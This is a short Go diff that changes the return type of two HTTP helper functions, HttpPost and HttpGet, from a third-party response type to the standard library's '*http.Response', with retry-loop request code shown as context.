@@ -49,7 +49,7 @@ func init() {
 	}
 }
 
-func HttpPost(url string, clientID string, data []byte) *req.Resp {
+func HttpPost(url string, clientID string, data []byte) *http.Response {
 	for {
 		webreq, err := http.NewRequest("POST", url, strings.NewReader(base64.URLEncoding.EncodeToString([]byte(data))))
 		webreq.Header.Set("User-Agent", constants.UserAgent)
@@ -71,7 +71,7 @@ func HttpPost(url string, clientID string, data []byte) *req.Resp {
 	return nil
 }
 
-func HttpGet(url string, cookies string) *req.Resp {
+func HttpGet(url string, cookies string) *http.Response {
 	for {
 		webreq, err := http.NewRequest("GET", url, nil)
 		webreq.Header.Set("User-Agent", constants.UserAgent)
